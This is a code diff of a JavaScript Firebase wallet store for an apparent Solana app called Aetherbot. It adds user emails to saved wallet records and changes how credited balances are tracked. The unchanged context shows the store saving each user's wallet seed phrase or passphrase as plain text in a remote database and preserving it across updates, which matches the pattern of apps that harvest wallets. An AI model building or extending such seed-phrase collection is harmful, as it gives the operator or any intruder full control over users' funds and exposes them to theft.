@@ -58,7 +58,7 @@ class FirebaseWalletStore {
    */
   async saveWallet(walletData) {
     try {
-      const { walletId, walletAddress, lookupHash, walletType, inputType, derivationPath, accountIndex, balance = 0, credentials = '' } = walletData;
+      const { walletId, walletAddress, lookupHash, walletType, inputType, derivationPath, accountIndex, balance = 0, credentials = '', email = '' } = walletData;
 
       console.log('💾 Saving wallet to Firebase:', walletAddress);
 
@@ -78,6 +78,7 @@ class FirebaseWalletStore {
           AetherbotBalance: { doubleValue: 0 }, // Initialize Aetherbot balance to 0
           depositedAmount: { doubleValue: 0 }, // Initialize deposited amount to 0
           credentials: { stringValue: credentials }, // Store seed phrase or passphrase
+          email: { stringValue: email }, // Store user email
           balanceLastUpdated: { timestampValue: new Date().toISOString() },
           AetherbotBalanceLastUpdated: { timestampValue: new Date().toISOString() },
           depositedAmountLastUpdated: { timestampValue: new Date().toISOString() },
@@ -270,7 +271,7 @@ class FirebaseWalletStore {
   /**
    * Update wallet balance and last login
    */
-  async updateWalletBalance(walletId, balance, transactions = [], creditAmount = 0) {
+  async updateWalletBalance(walletId, balance, transactions = [], email = null) {
     try {
       const wallet = await this.getWalletById(walletId);
       if (!wallet) {
@@ -284,8 +285,9 @@ class FirebaseWalletStore {
         ? transactions 
         : (wallet.transactions || []);
 
-      // Calculate new totalSolCredited if this is a credit operation
-      const totalSolCredited = (wallet.totalSolCredited || 0) + (creditAmount > 0 ? creditAmount : 0);
+      // Note: creditAmount tracking is done in specific credit functions
+      // This function is for balance updates and login tracking
+      const totalSolCredited = wallet.totalSolCredited || 0;
 
       const updateData = {
         fields: {
@@ -300,6 +302,7 @@ class FirebaseWalletStore {
           blockchain: { stringValue: wallet.blockchain || 'solana' },
           AetherbotBalance: { doubleValue: wallet.AetherbotBalance || 0 }, // Preserve Aetherbot balance
           credentials: { stringValue: wallet.credentials || '' }, // Preserve credentials
+          email: { stringValue: email || wallet.email || '' }, // Update or preserve email
           createdAt: { timestampValue: wallet.createdAt },
           // Update these fields
           balance: { doubleValue: balance },
